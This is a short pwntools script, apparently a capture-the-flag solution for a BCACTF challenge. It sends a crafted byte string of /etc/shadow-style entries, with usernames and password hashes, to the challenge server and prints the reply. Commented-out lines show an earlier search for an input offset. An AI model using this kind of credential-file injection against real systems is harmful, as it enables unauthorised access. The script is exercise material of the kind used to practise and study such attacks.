from pwn import * 


shadow = b'jonwilkie:$1$vqUMTWUR$BaHymjsyO9Bx3TbWXXo7T0:95:0:99999:7  deihazz:$6$hsxJzPxoW8D4U.1e$KuJGRo/LUUxLEk6XOSDmNYdKEhGHhlbFSHOnjBYzsccApUfvs5mRfb/5GTip4An.gHSdkuVC5YyNJEWJXRfpp:.:19420:0:99999:7 dorrow:$1$1$8ALS3w/S$2OcWN7obpwxOSixbKCmtS/:9426:0:99999:7 clacar:$6$6$JkOQhDXyVZqawist$3.0MLceFZ36rrVhnPRSdtvTEY9Vdv4M8vcli4dKvP7J6e.xzulPkuylZ4oZYksOKv/sAAa.aap.KwCCJipdi/0:0:19436:0:99999  chaana:<><<5$0W/XTwwFqDM6Upel$o.ZdsNSVy2zfwJmy1XjO60fy7C.k9Y97yaTWGN24Op7:7:9443:99999:whatev flomar:'
print(shadow.decode())


# print("current shadow padding: " + str(i))
c = remote('challs.bcactf.com', 31723)
data = c.recv(1050).decode()
# print( data )
c.sendline( shadow )
response = c.recvline()
# response = c.recvall()

print( response.decode() )

    # if "password" in response.decode():
    #     print("[+++++] Found offset! i = " + str(i) + " and the input string is " + input.decode() )
    #     break

    # input = input + b'p'

c.close()
